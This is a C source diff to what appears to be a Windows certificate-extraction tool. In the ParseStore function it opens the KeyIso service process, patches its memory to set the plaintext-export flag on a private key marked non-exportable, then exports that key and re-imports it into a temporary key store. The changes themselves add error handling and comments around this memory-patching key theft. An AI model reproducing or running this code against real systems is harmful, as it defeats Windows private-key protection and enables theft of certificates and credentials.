@@ -336,30 +336,56 @@ ParseStore(
             // This code path is for CNG
             // Retrieve a handle to the Service Control Manager
             SC_HANDLE hSCManager = OpenSCManager(
-                        NULL,
-                        NULL,
-                        SC_MANAGER_CONNECT);
+                        NULL,                     // local computer
+                        NULL,                     // ServicesActive database
+                        SC_MANAGER_CONNECT);      // connect to the service control manager
+            if (NULL == hSCManager)
+            {
+                printf("OpenSCManager failed: %x\n", GetLastError());
+                continue;
+            }
+
             // Retrieve a handle to the KeyIso service
             SC_HANDLE hService = OpenService(
                         hSCManager,
                         L"KeyIso",
                         SERVICE_QUERY_STATUS);
+            if (NULL == hService)
+            {
+                printf("OpenService failed: %x\n", GetLastError());
+                CloseServiceHandle(hSCManager);
+                continue;
+            }
+
             // Retrieve the status of the KeyIso process, including its Process
             // ID
             SERVICE_STATUS_PROCESS ssp;
             DWORD dwBytesNeeded;
-            QueryServiceStatusEx(
-                        hService,
-                        SC_STATUS_PROCESS_INFO,
-                        (BYTE*)&ssp,
-                        sizeof(SERVICE_STATUS_PROCESS),
-                        &dwBytesNeeded);
+            if ( !QueryServiceStatusEx(
+                        hService,                       // handle to service
+                        SC_STATUS_PROCESS_INFO,         // information level
+                        (BYTE*)&ssp,                    // address of structure
+                        sizeof(SERVICE_STATUS_PROCESS), // size of structure
+                        &dwBytesNeeded) )               // size needed if buffer is too small
+            {
+                printf("QueryServiceStatusEx failed: %x\n", GetLastError());
+                CloseServiceHandle(hService);
+                CloseServiceHandle(hSCManager);
+                continue;
+            }
+
             // Open a read-write handle to the process hosting the KeyIso
             // service
             HANDLE hProcess = OpenProcess(
                         PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                         FALSE,
                         ssp.dwProcessId);
+            if( hProcess == NULL )
+            {
+                printf("OpenProcess failed\n");
+                continue;
+            }
+
             // Prepare the structure offsets for accessing the appropriate
             // field
             DWORD dwOffsetNKey;
@@ -388,27 +414,42 @@ ParseStore(
             // Mark the certificate's private key as exportable
             DWORD pKspKeyInLsass;
             SIZE_T sizeBytes;
-            ReadProcessMemory(
+            if ( !ReadProcessMemory(
                         hProcess,
                         (void*)(*(SIZE_T*)*(DWORD*)(hNKey + dwOffsetNKey) +
                                 dwOffsetSrvKeyInLsass),
                         &pKspKeyInLsass,
                         sizeof(DWORD),
-                        &sizeBytes);
+                        &sizeBytes) )
+            {
+                fprintf(stderr, "Cannot read process memory for KspKeyInLsass: %x\n", GetLastError() );
+                continue;
+            }
+
             unsigned char ucExportable;
-            ReadProcessMemory(
+            if ( !ReadProcessMemory(
                         hProcess,
                         (void*)(pKspKeyInLsass + dwOffsetKspKeyInLsass),
                         &ucExportable,
                         sizeof(unsigned char),
-                        &sizeBytes);
+                        &sizeBytes) )
+            {
+                fprintf(stderr, "Cannot read process memory for ucExportable: %x\n", GetLastError() );
+                continue;
+            }
+
             ucExportable |= NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
-            WriteProcessMemory(
+            if ( !WriteProcessMemory(
                         hProcess,
                         (void*)(pKspKeyInLsass + dwOffsetKspKeyInLsass),
                         &ucExportable,
                         sizeof(unsigned char),
-                        &sizeBytes);
+                        &sizeBytes) )
+            {
+                fprintf(stderr, "Cannot write process memory for ucExportable: %x\n", GetLastError() );
+                continue;
+            }
+
             // Export the private key
             SECURITY_STATUS ss = NCryptExportKey(
                         hNKey,
@@ -419,6 +460,12 @@ ParseStore(
                         0,
                         &cbData,
                         0);
+            if ( ERROR_SUCCESS != ss )
+            {
+                fprintf(stderr, "Cannot get size of private key to export: SECURITY_STATUS return code is %d - last error %x\n", ss, GetLastError() );
+                continue;
+            }
+
             pbData = (BYTE*)malloc(cbData);
             ss = NCryptExportKey(
                         hNKey,
@@ -429,15 +476,29 @@ ParseStore(
                         cbData,
                         &cbData,
                         0);
+            if ( ERROR_SUCCESS != ss )
+            {
+                fprintf(stderr, "Cannot get private key: SECURITY_STATUS return code is %d - last error %x\n", ss, GetLastError() );
+                free(pbData);
+                continue;
+            }
+
             // Establish a temporary CNG key store provider
             NCRYPT_PROV_HANDLE hProvider;
-            NCryptOpenStorageProvider(
+            ss = NCryptOpenStorageProvider(
                         &hProvider,
                         MS_KEY_STORAGE_PROVIDER,
                         0);
+            if ( ERROR_SUCCESS != ss )
+            {
+                fprintf(stderr, "NCryptOpenStorageProvider error: SECURITY_STATUS return code is %d - last error %x\n", ss, GetLastError() );
+                free(pbData);
+                continue;
+            }
+
             // Import the private key into the temporary storage provider
             NCRYPT_KEY_HANDLE hKeyNew;
-            NCryptImportKey(
+            ss = NCryptImportKey(
                         hProvider,
                         NULL,
                         LEGACY_RSAPRIVATE_BLOB,
@@ -446,6 +507,12 @@ ParseStore(
                         pbData,
                         cbData,
                         0);
+            if ( ERROR_SUCCESS != ss )
+            {
+                fprintf(stderr, "cannot reimport exported key: SECURITY_STATUS return code is %d - last error %x\n", ss, GetLastError() );
+                free(pbData);
+                continue;
+            }
         }
 
         // ask for pwd to encrypt exported private key
